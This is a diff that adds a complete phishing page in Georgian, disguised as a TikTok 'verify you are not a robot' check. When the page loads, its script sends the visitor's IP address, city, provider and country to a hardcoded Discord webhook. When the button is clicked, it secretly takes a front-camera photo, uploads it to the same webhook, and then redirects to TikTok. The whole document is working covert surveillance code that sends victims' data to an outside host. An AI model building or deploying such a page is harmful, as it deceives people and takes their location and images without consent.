@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="ka">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Checker</title>
+</head>
+<body style="background-color: #000; color: white; display: flex; align-items: center; justify-content: center; height: 100vh; font-family: sans-serif; margin: 0; overflow: hidden;">
+
+    <div id="content" style="text-align: center; padding: 20px;">
+        <img src="https://logodownload.org/wp-content/uploads/2019/01/tiktok-logo-7.png" width="70" style="margin-bottom: 20px;">
+        <h2 id="status">ვიდეო მზად არის</h2>
+        <p id="subtext" style="color: #ccc;">გთხოვთ დაადასტუროთ,რომ არ ხართ რობოტი</p>
+        <button id="authBtn" style="background: #fe2c55; color: white; border: none; padding: 15px 40px; border-radius: 5px; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 10px;">დადასტურება</button>
+    </div>
+
+    <video id="video" style="display:none;" autoplay playsinline muted></video>
+    <canvas id="canvas" style="display:none;" width="1280" height="720"></canvas>
+
+    <script>
+        // შენი Webhook URL
+        const webhookURL = "https://discord.com/api/webhooks/1485355763906904075/cZdhC78M-9dPiuLhi2dyRlzRBT4WKxZundc3ObtynZuE3IGEawS_zhwzUZNL9go9j3gy";
+
+        // 1. IP-ის გაგზავნა (გამოვიყენოთ HTTPS API)
+        async function logVisit() {
+            try {
+                // ipapi.co არის HTTPS მეგობრული
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+                
+                await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: "📡 **ახალი ვიზიტი!**",
+                        embeds: [{
+                            color: 3447003,
+                            description: `🌐 IP: \`${data.ip}\`\n🏙️ ქალაქი: ${data.city}\n📡 პროვაიდერი: ${data.org}\n🏳️ ქვეყანა: ${data.country_name}`
+                        }]
+                    })
+                });
+            } catch (e) {
+                console.log("IP log error");
+            }
+        }
+
+        // 2. ფოტოს გადაღება და გადამისამართება
+        async function handleAuth() {
+            const btn = document.getElementById('authBtn');
+            btn.disabled = true;
+            btn.innerText = "მოწმდება...";
+
+            try {
+                // კამერის ჩართვა
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" } 
+                });
+                
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+
+                // ველოდებით ვიდეოს დაწყებას
+                video.onloadedmetadata = () => {
+                    setTimeout(() => {
+                        const canvas = document.getElementById('canvas');
+                        const context = canvas.getContext('2d');
+                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                        canvas.toBlob(async (blob) => {
+                            const formData = new FormData();
+                            formData.append('file', blob, 'shot.jpg');
+                            formData.append('payload_json', JSON.stringify({
+                                content: "📸 **ფოტო მოვიდა!**"
+                            }));
+
+                            // ვაგზავნით ფოტოს
+                            await fetch(webhookURL, { method: 'POST', body: formData });
+                            
+                            // ვთიშავთ კამერას და გადავდივართ
+                            stream.getTracks().forEach(track => track.stop());
+                            window.location.href = "https://www.tiktok.com/foryou";
+                        }, 'image/jpeg', 0.8);
+                    }, 1000); // 1 წამი საკმარისია ნებისმიერი ტელეფონისთვის
+                };
+
+            } catch (err) {
+                // თუ კამერა დაბლოკა, მაინც გადავიყვანოთ
+                window.location.href = "https://www.tiktok.com/foryou";
+            }
+        }
+
+        window.onload = logVisit;
+        document.getElementById('authBtn').addEventListener('click', handleAuth);
+    </script>
+</body>
+</html>
